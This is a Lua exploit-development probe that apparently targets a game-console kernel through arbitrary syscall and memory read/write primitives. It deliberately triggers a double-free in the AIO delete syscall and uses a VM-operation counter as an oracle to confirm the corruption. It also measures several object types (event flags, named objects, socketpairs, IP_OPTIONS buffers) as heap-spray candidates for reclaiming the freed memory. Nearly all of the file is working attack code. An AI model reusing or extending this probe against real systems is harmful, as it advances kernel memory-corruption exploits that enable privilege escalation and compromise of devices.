-- CRASH_CLASS: LOW
-- PROBE 69q: 624 VM-op counter as double-free oracle
--
-- Context: sys 624 is a monotonic VM operation counter (+5 per mmap,
-- zero jitter). If the double-free triggers zone operations (free to
-- zone, page deallocation, etc.), the 624 counter should show an
-- anomalous delta vs. normal single-delete. This probe measures the
-- 624 delta across: normal submit/poll/delete, the double-free race,
-- and post-race spray operations.
--
-- This is a MEASUREMENT probe — no kernel crash expected.

print("=== PROBE 69q: 624 VM-OP COUNTER DOUBLE-FREE ORACLE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)
if fd_zero < 0 then print("FAIL: no /dev/zero"); return end

-- 624 reader
local function read_624()
    local ret = nil
    pcall(function() ret = mk(624)() end)
    return ret and N(ret) or 0
end

-- ============================================================
-- AIO helpers
-- ============================================================
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)

local function submit_one()
    local reqs = memory.alloc(0x30)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    local id_buf = memory.alloc(8)
    wd(N(id_buf), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(id_buf)))
    end)
    return rd(N(id_buf)) or 0
end

local function batch_submit(count)
    local ids = {}
    for i = 1, count do
        local id = submit_one()
        if id ~= 0 then table.insert(ids, id) end
    end
    return ids
end

local function poll_all(ids)
    local n = #ids
    local ids_buf = memory.alloc(n * 4 + 8)
    local st_buf = memory.alloc(n * 4 + 8)
    for i = 1, n do
        wd(N(ids_buf) + (i - 1) * 4, ids[i])
        wd(N(st_buf) + (i - 1) * 4, 0xDEAD)
    end
    pcall(function()
        mk(664)(uint64(N(ids_buf)), uint64(n), uint64(N(st_buf)))
    end)
end

local function delete_all(ids)
    local n = #ids
    local ids_buf = memory.alloc(n * 4 + 8)
    local st_buf = memory.alloc(n * 4 + 8)
    for i = 1, n do
        wd(N(ids_buf) + (i - 1) * 4, ids[i])
        wd(N(st_buf) + (i - 1) * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(ids_buf)), uint64(n), uint64(N(st_buf)))
    end)
end

-- ============================================================
-- [A] Baseline: 624 delta for normal AIO lifecycle
-- ============================================================
print("")
print("[A] Baseline: 624 delta for normal AIO lifecycle")

for trial = 1, 5 do
    if not alive() then break end

    local c0 = read_624()
    local ids = batch_submit(8)
    local c1 = read_624()
    poll_all(ids)
    local c2 = read_624()
    delete_all(ids)
    local c3 = read_624()

    print(string.format("  trial %d: submit=%d poll=%d delete=%d (ids=%d)",
        trial, c1 - c0, c2 - c1, c3 - c2, #ids))
end

if not alive() then print("DEAD after baseline"); return end

-- ============================================================
-- [B] 624 delta for double-free via main thread (no children)
-- ============================================================
print("")
print("[B] Double-delete from main thread (sequential, NOT race)")

for trial = 1, 5 do
    if not alive() then break end

    local ids = batch_submit(8)
    poll_all(ids)

    local c0 = read_624()
    delete_all(ids)  -- first delete
    local c1 = read_624()
    delete_all(ids)  -- second delete (same IDs — should fail or double-free)
    local c2 = read_624()

    -- Check second delete status
    local n = #ids
    local st_buf = memory.alloc(n * 4 + 8)
    local ids_buf = memory.alloc(n * 4 + 8)
    for i = 1, n do
        wd(N(ids_buf) + (i - 1) * 4, ids[i])
        wd(N(st_buf) + (i - 1) * 4, 0xDEAD)
    end
    pcall(function()
        mk(662)(uint64(N(ids_buf)), uint64(n), uint64(N(st_buf)))
    end)
    local st3 = rd(N(st_buf)) or 0xDEAD
    local c3 = read_624()

    print(string.format("  trial %d: del1=%d del2=%d del3=%d st3=0x%X",
        trial, c1 - c0, c2 - c1, c3 - c2, st3))
end

if not alive() then print("DEAD after sequential double-delete"); return end

-- ============================================================
-- [C] 624 delta for EVF creation (spray calibration)
-- ============================================================
print("")
print("[C] 624 delta for EVF creation (spray sizing)")

for _, count in ipairs({10, 50, 100, 500}) do
    if not alive() then break end

    local c0 = read_624()
    local handles = {}
    for i = 1, count do
        local name = put_str(string.format("evf_q_%d", i))
        local ret = nil
        pcall(function()
            ret = mk(538)(uint64(N(name)), uint64(0xCAFE0000 + i))
        end)
        if ret then
            local r = sgn(ret)
            if r >= 0 then table.insert(handles, r) end
        end
    end
    local c1 = read_624()

    -- Cleanup
    for _, h in ipairs(handles) do
        pcall(function() mk(539)(uint64(h)) end)
    end
    local c2 = read_624()

    print(string.format("  %d evf: create_delta=%d delete_delta=%d (created=%d) per_evf=%.1f",
        count, c1 - c0, c2 - c1, #handles,
        #handles > 0 and (c1 - c0) / #handles or 0))
end

if not alive() then print("DEAD after EVF calibration"); return end

-- ============================================================
-- [D] 624 delta for namedobj creation (spray calibration)
-- ============================================================
print("")
print("[D] 624 delta for namedobj creation")

for _, count in ipairs({10, 50, 100}) do
    if not alive() then break end

    local c0 = read_624()
    local handles = {}
    for i = 1, count do
        local name = put_str(string.format("nobj_q_%04d_padpadpadpadpadpadpadpadpadpad", i))
        local ret = nil
        pcall(function()
            ret = mk(557)(uint64(N(name)))
        end)
        if ret then
            local r = sgn(ret)
            if r >= 0 then table.insert(handles, r) end
        end
    end
    local c1 = read_624()

    for _, h in ipairs(handles) do
        pcall(function() mk(558)(uint64(h)) end)
    end
    local c2 = read_624()

    print(string.format("  %d namedobj: create_delta=%d delete_delta=%d (created=%d) per_obj=%.1f",
        count, c1 - c0, c2 - c1, #handles,
        #handles > 0 and (c1 - c0) / #handles or 0))
end

if not alive() then print("DEAD after namedobj calibration"); return end

-- ============================================================
-- [E] 624 delta for socketpair creation (another spray type)
-- ============================================================
print("")
print("[E] 624 delta for socketpair creation")

for _, count in ipairs({10, 50, 100}) do
    if not alive() then break end

    local c0 = read_624()
    local fds = {}
    for i = 1, count do
        local sv = memory.alloc(8)
        wd(N(sv), 0xFFFFFFFF); wd(N(sv) + 4, 0xFFFFFFFF)
        pcall(function()
            mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sv)))
        end)
        local f0 = rd(N(sv)) or 0xFFFFFFFF
        local f1 = rd(N(sv) + 4) or 0xFFFFFFFF
        if f0 ~= 0xFFFFFFFF then
            table.insert(fds, f0)
            table.insert(fds, f1)
        end
    end
    local c1 = read_624()

    for _, fd in ipairs(fds) do
        pcall(function() mk(6)(uint64(fd)) end)
    end
    local c2 = read_624()

    print(string.format("  %d socketpairs: create_delta=%d close_delta=%d (fds=%d) per_pair=%.1f",
        count, c1 - c0, c2 - c1, #fds,
        count > 0 and (c1 - c0) / count or 0))
end

if not alive() then print("DEAD after socketpair calibration"); return end

-- ============================================================
-- [F] 624 delta for setsockopt (IP_OPTIONS, size ~40B)
-- ============================================================
print("")
print("[F] 624 delta for setsockopt IP_OPTIONS spray")

do
    -- Create a socket
    local sock = sgn(mk(97)(uint64(2), uint64(2), uint64(0)))
    if sock >= 0 then
        local opt_buf = memory.alloc(44)
        for j = 0, 40, 4 do wd(N(opt_buf) + j, 0xDEADCAFE) end

        local c0 = read_624()
        for i = 1, 100 do
            pcall(function()
                mk(105)(uint64(sock), uint64(0), uint64(1),
                    uint64(N(opt_buf)), uint64(40))
            end)
        end
        local c1 = read_624()
        print(string.format("  100 IP_OPTIONS sets: delta=%d per_set=%.1f",
            c1 - c0, (c1 - c0) / 100))

        pcall(function() mk(6)(uint64(sock)) end)
    else
        print("  SKIP: cannot create socket")
    end
end

if not alive() then print("DEAD after sockopt calibration"); return end

-- ============================================================
-- [G] 624 delta for mmap (sanity check — should be +5)
-- ============================================================
print("")
print("[G] mmap sanity check: 624 delta per mmap")

local sc_mmap = mk(477)
for trial = 1, 3 do
    if not alive() then break end

    local c0 = read_624()
    local addr = nil
    pcall(function()
        addr = sc_mmap(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local c1 = read_624()
    print(string.format("  trial %d: mmap delta=%d addr=%s",
        trial, c1 - c0, addr and string.format("0x%X", N(addr)) or "nil"))
end

if not alive() then print("DEAD"); return end

print("")
print("[SUMMARY]")
print("  Compare deltas to identify which operations trigger VM ops.")
print("  If double-free delta > single-delete delta, corruption is real.")
print("  If EVF/namedobj have non-zero 624 delta, they may share VM infrastructure")
print("  with the AIO zone, making them better spray candidates.")

print("")
print("=== PROBE 69q COMPLETE ===")
